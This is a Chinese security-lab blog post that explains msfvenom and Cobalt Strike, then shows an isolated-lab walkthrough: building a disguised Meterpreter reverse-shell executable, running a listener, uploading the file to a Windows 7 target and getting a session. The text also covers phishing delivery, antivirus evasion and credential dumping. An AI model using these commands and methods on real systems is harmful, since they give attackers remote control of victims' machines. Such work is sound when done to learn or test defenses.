+++
title= "【攻防实践】MSF恶意程序利用与CS上线"
date= "2026-01-03T13:48:09+08:00"
lastmod= "2026-01-03T13:48:09+08:00"
draft=false
author= "leuco"
description= "【2】制作WIndows恶意软件获取Shell"
keywords= ["msfvenom", "shell", "Windowsl", "CS"]
categories= ["网络空间安全", "攻防实践"]
tags= ["msfvenom", "shell", "Windowsl", "CS"]
math=true

+++

# MSF恶意程序利用与CS上线

{{<toc>}}

## 实践概览

- **名称**：MSF恶意程序利用与CS上线
- **目的**：使用MSFVenom恶意软件获取shell；使用Cobalt Strike生成后门
- **时间**：2026年1月3日
- **风险说明**：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试

## MSFVenom

**定义：** msfvenom 是 **Metasploit Framework** 的一部分，它是一个独立的 **攻击载荷生成器**。它取代了旧版的 `msfpayload` 和 `msfencode` 工具，用于创建和编码各种格式的 shellcode 或可执行文件。

**主要功能：**

- **生成载荷：** 可以生成适用于几乎所有操作系统（Windows, Linux, macOS, Android等）和架构（x86, x64, ARM等）的攻击载荷。
- **多种格式：** 输出格式多样，如可执行文件（.exe, .elf）、动态链接库（.dll）、Web脚本（.php, .aspx）、Shell代码（C、Python、Ruby等格式的原始字节）等。
- **编码与规避：** 内置多种编码器（如 `x86/shikata_ga_nai`），可以对生成的载荷进行混淆，以绕过基础的静态杀毒软件（AV）检测。
- **捆绑：** 可以将攻击载荷与一个正常的合法程序（如计算器、PDF阅读器）捆绑在一起，诱骗目标运行。
- **转换格式：** 可以将载荷在不同格式之间转换。

**典型工作流程：**

1. 红队人员决定攻击目标（例如：Windows 10 x64）。

2. 使用 msfvenom 命令生成一个反向 TCP 连接的 Windows 后门：

   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机 LPORT=4444 -f exe -o payload.exe
   ```

3. 通过社会工程学（如钓鱼邮件）将 `payload.exe` 投递到目标机器。

4. 目标运行后，会在其机器上建立一个与攻击者 Metasploit 监听器（`multi/handler`）的连接。

5. 攻击者获得一个 **Meterpreter** shell，可以进行基本的后期利用。

**特点：**

- **免费且开源。**
- **功能单一但强大**，专注于载荷生成。
- 通常需要与 **Metasploit Framework** 的其他模块（如监听器、利用模块）配合使用。
- 在绕过现代EDR/AV方面能力有限，生成的载荷容易被高级安全软件检测。

## Cobalt Strike

**定义：** Cobalt Strike 是一个 **商业的、综合性的红队和对手模拟平台**。它远不止一个载荷生成器，而是一个集成了 **指挥与控制、钓鱼攻击、横向移动、权限提升、报告生成** 等功能的完整作战系统。

**主要功能：**

1. **高级攻击载荷：**
   - **Beacon：** Cobalt Strike 的核心载荷，是一个高度可定制的、隐蔽的“心跳”代理。支持多种通信协议（HTTP/HTTPS, DNS, SMB）和回调方式。
   - 生成经过高度混淆、签名、或利用各种技术（如进程注入、模块反射式加载）的 Beacon 载荷，以绕过杀毒软件和终端检测与响应（EDR）。
2. **图形化指挥与控制：**
   - 所有上线的被控主机（Beacon）都在一个直观的图形界面中显示，可以分组、打标签。
   - 通过右键菜单或命令，轻松向任何 Beacon 发送指令（文件操作、截图、键盘记录、提权等）。
3. **内网横向移动：**
   - **端口扫描**和**服务发现**。
   - **凭据转储**（从内存中提取密码哈希和票据）。
   - **哈希传递**、**票据传递** 攻击。
   - **SMB Beacon** 用于穿透没有直接外网连接的内部网络节点。
4. **鱼叉式网络钓鱼：**
   - 内置模板和服务器，可以方便地创建和管理钓鱼邮件活动，追踪点击和载荷执行情况。
5. **Malleable C2 配置文件：**
   - 这是 Cobalt Strike 的灵魂功能。允许操作员 **完全自定义 Beacon 的通信模式**（如模拟成 Google、CloudFlare 等合法服务的流量），极大地增强了隐蔽性和对抗网络流量分析的能力。
6. **团队协作：** 支持多个操作员同时连接到一个团队服务器，协同工作。
7. **报告与日志：** 自动记录所有操作，便于生成最终的攻击报告。

**典型工作流程：**

1. 红队启动 **Cobalt Strike 团队服务器**。
2. 操作员使用 **Cobalt Strike 客户端** 连接。
3. 使用 **“攻击”->“生成Payload”** 创建一个高度定制的 Beacon（例如，使用 Malleable C2 配置文件模拟正常流量）。
4. 通过 **鱼叉式钓鱼** 或利用其他漏洞投递 Beacon。
5. 目标上线后，在可视化地图上看到新主机。
6. 操作员通过 Beacon 进行信息收集，利用内置工具进行凭据转储，然后在内网横向移动，逐步控制更多关键资产。

**特点：**

- **商业软件**，价格昂贵，但功能极其强大。
- **高度集成化和自动化**，将红队行动的各个阶段无缝衔接。
- **以隐匿和对抗现代安全防御为核心设计**。
- 是 **高级持续性威胁（APT）模拟** 和 **成熟红队** 的首选工具。

## 环境配置

- **虚拟环境**：VMware Workstation 17 Pro - 17.0.0 build-20800274
- **靶机**：
  - **系统**：Windows 7 Enterprise x64
  - **CPU**：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)
  - **网络**：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）
- **攻击机**：
  - **系统**：Linux kali 6.12.25-amd64
  - **CPU**：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)
  - **网络**：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）

## 实践步骤

### MFS恶意程序利用

#### 使用msfvenom制作恶意软件

```bash
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.223 LPORT=4448 -f exe > Notice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

文件存储于`/root/Notice.exe`

#### 制作监听程序

监听程序的制作过程与[Metasploit持久化后门攻击](https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%88%A9%E7%94%A8windows%E6%9C%8D%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81)相同：

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.223
LHOST => 10.0.0.223
msf6 exploit(multi/handler) > set LPORT 4448
LPORT => 4448
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.0.223:4448 
```

#### 将恶意程序传输下载到靶机

这里通过[MS17-010漏洞与Metasploit](https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#metasploit%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)实现恶意程序的[upload](https://leuco-yuu.github.io/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#3-%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E4%B8%8E%E4%B8%8A%E4%BC%A0):

```bash
meterpreter > upload /root/Notice.exe > C:\\
[*] Uploading  : /root/Notice.exe -> C:\Notice.exe
[*] Completed  : /root/Notice.exe -> C:\Notice.exe
```

#### 等待靶机执行恶意程序

监听器获取到用户权限

```bash
[*] Sending stage (177734 bytes) to 10.0.0.17
[*] Meterpreter session 1 opened (10.0.0.223:4448 -> 10.0.0.17:49864) at 2026-01-03 08:00:49 +0000

meterpreter > getuid
Server username: Ankh-PC\Ankh
```



